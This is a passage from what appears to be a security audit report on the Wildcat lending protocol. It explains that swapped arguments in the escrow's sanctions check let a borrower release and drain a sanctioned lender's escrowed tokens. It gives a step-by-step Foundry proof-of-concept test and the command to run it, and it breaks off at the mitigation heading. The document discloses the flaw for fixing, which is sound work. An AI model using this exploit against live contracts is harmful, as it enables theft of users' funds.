whether `releaseEscrow()` should proceed or revert:\n\n```solidity\nfunction canReleaseEscrow() public view override returns (bool) {\n\t//@audit                                                 Larry      Bob\n\t//                                                         \u2193         \u2193\n\treturn !WildcatSanctionsSentinel(sentinel).isSanctioned(borrower, account);\n}\n```\n\nThe misordered parameters impact the return value of `sentinel.isSanctioned()`. It mistakenly checks Bob against the sanctions list, where he is not sanctioned.\n\n```solidity\n//@audit                       Larry              Bob\n//                               \u2193                 \u2193\nfunction isSanctioned(address borrower, address account) public view override returns (bool) {\n return\n   !sanctionOverrides[borrower][account] && // true\n   IChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account); // false\n}\n```\n\nThus `isSanctioned()` returns `false` and consequently `canReleaseEscrow()` returns `true`. This allows Bob to successfully execute `releaseEscrow()` and drain all of Larry's market tokens:\n\n```solidity\nfunction releaseEscrow() public override {\n  if (!canReleaseEscrow()) revert CanNotReleaseEscrow();\n\n  uint256 amount = balance();\n  \n  //@audit                 Bob   Larry's $\n  //                        \u2193       \u2193\n  IERC20(asset).transfer(account, amount);\n\n  emit EscrowReleased(account, asset, amount);\n}\n```\n\nAfter this, Bob simply needs to authorize himself as a lender in his own market and withdraw the actual assets.\n\nBelow is a PoC demonstrating how to execute the exploit.\n\nTo proceed, please include the following import statements in `test/market/WildcatMarketConfig.t.sol`:\n\n```solidity\nimport 'src/WildcatSanctionsEscrow.sol';\n\nimport \"forge-std/console2.sol\";\n```\n\nAdd the following test `test/market/WildcatMarketConfig.t.sol` as well:\n\n```solidity\nfunction test_borrowerCanStealSanctionedLendersFunds() external {\n  vm.label(borrower, \"bob\"); // Label borrower for better trace readability\n\n  // This is Larry The Lender\n  address larry = makeAddr(\"larry\");\n\n  // Larry deposists 10e18 into Bob's market\n  _deposit(larry, 10e18);\n\n  // Larry's been a bad guy and gets sanctioned\n  sanctionsSentinel.sanction(larry);\n\n  // Larry gets nuked by the borrower\n  vm.prank(borrower);\n  market.nukeFromOrbit(larry);\n\n  // The vulnerable escrow in which Larry's funds get moved\n  address vulnerableEscrow = sanctionsSentinel.getEscrowAddress(larry, borrower, address(market));\n  vm.label(vulnerableEscrow, \"vulnerableEscrow\");\n\n  // Ensure Larry's funds have been moved to his escrow\n  assertEq(market.balanceOf(larry), 0);\n  assertEq(market.balanceOf(vulnerableEscrow), 10e18);\n\n  // Malicious borrower is able to release the escrow due to the vulnerability\n  vm.prank(borrower);\n  WildcatSanctionsEscrow(vulnerableEscrow).releaseEscrow();\n\n  // Malicious borrower has all of Larry's tokens\n  assertEq(market.balanceOf(borrower), 10e18);\n\n  // The borrower authorizes himself as a lender in the market\n  _authorizeLender(borrower);\n\n  // Queue withdrawal of all funds\n  vm.prank(borrower);\n  market.queueWithdrawal(10e18);\n\n  // Fast-forward to when the batch duration expires\n  fastForward(parameters.withdrawalBatchDuration);\n  uint32 expiry = uint32(block.timestamp);\n\n  // Execute the withdrawal\n  market.executeWithdrawal(borrower, expiry);\n\n  // Assert the borrower has drained all of Larry's assets\n  assertEq(asset.balanceOf(borrower), 10e18);\n}\n```\n\nRun the PoC like this:\n\n```sh\nforge test --match-test test_borrowerCanStealSanctionedLendersFunds -vvvv\n```\n\n## Tools Used\n\nManual review\n## Recommended Mitigation Steps\n\n1.
